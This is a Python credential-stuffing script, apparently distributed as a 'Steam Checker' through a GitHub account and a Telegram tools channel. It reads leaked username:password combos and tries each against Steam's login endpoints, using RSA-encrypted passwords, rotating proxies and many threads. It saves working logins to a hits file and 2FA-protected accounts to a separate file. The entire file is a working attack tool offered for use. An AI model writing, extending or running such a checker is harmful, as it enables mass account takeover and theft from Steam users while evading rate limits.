import os
import requests
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import base64
import time
import random
import concurrent.futures
from loguru import logger
from colorama import Fore, Style, init

init(autoreset=True)

if not os.path.exists("results"):
    os.makedirs("results")

def load_proxies():
    with open("proxy.txt", "r", encoding="utf-8") as file:
        proxies_list = file.readlines()
    return [proxy.strip() for proxy in proxies_list]

proxies_list = load_proxies()

def process_combo(combo):
    user, passw = combo.strip().split(":")
    user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'

    while True:
        s = requests.Session()

        proxy = random.choice(proxies_list)
        proxies = {
            'http': "http://" + proxy,
            'https': "http://" + proxy,
        }

        url = 'https://steamcommunity.com/login/getrsakey/'
        values = {'username': user, 'donotcache': str(int(time.time() * 1000))}
        headers = {'User-Agent': user_agent}
        
        try:
            response = s.post(url, data=values, headers=headers, proxies=proxies)
            data = response.json()
            if not data.get("success"):
                print(f"Failed to get key for {user}")
                return

            mod = int(data["publickey_mod"], 16)
            exp = int(data["publickey_exp"], 16)
            rsa = RSA.construct((mod, exp))
            cipher = PKCS1_v1_5.new(rsa)
            encrypted_password = base64.b64encode(cipher.encrypt(passw.encode())).decode()

            url2 = 'https://steamcommunity.com/login/dologin/'
            values2 = {
                'username': user,
                "password": encrypted_password,
                "emailauth": "",
                "loginfriendlyname": "",
                "captchagid": "-1",
                "captcha_text": "",
                "emailsteamid": "",
                "rsatimestamp": data["timestamp"],
                "remember_login": False,
                "donotcache": str(int(time.time() * 1000)),
            }
            headers2 = {'User-Agent': user_agent}
            
            response2 = s.post(url2, data=values2, headers=headers2, proxies=proxies)
            data2 = response2.json()
            if data2["success"] == True:
                logger.success(f"Logged in successfully for [{user}] ")
                with open("results/hit.txt", "a", encoding="utf-8") as hit_file:
                    hit_file.write(f"{user}:{passw}\n")
                break
            else:
                if data2.get('emailauth_needed', False):
                    logger.warning(f"2FA BAD ACCOUNT [{user}]")
                    with open("results/2fa.txt", "a", encoding="utf-8") as fa_file:
                        fa_file.write(f"{user}:{passw}\n")
                else:
                    logger.error(f"BAD ACCOUNT [{user}]")
                break
        except Exception as e:
            logger.error(f"ERROR: {e}")
            continue

def main():

    print(Fore.MAGENTA+"""

███████╗████████╗███████╗ █████╗ ███╗   ███╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗ ████║    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
███████╗   ██║   █████╗  ███████║██╔████╔██║    ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
╚════██║   ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║    ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
███████║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
--------------------------------------------------------                                                                           
https://github.com/CinAlix // t.me/clownstools
"""+Style.RESET_ALL)

    th = int(input(Fore.MAGENTA +"HOW MANY THREAD: "+Style.RESET_ALL))
    with open("combo.txt", "r", encoding="utf-8") as file:
        combos = file.readlines()

    with concurrent.futures.ThreadPoolExecutor(max_workers=th) as executor:
        executor.map(process_combo, combos)

if __name__ == "__main__":
    main()
